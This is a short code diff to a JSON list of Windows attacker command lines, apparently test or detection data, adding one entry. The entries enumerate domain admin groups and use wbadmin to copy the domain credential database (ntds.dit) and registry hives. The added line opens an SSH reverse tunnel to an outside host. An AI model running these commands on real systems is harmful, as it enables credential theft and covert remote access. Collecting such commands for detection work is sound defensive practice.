@@ -70,7 +70,8 @@
       "whoami.exe /groups",
       "net.exe group \"domain admins\" /dom",
       "net.exe group \"enterprise admins\" /dom",
-      "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet"
+      "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet",
+      "ssh [email protected] -R *:10400 -p22"
     ]
   },
   {
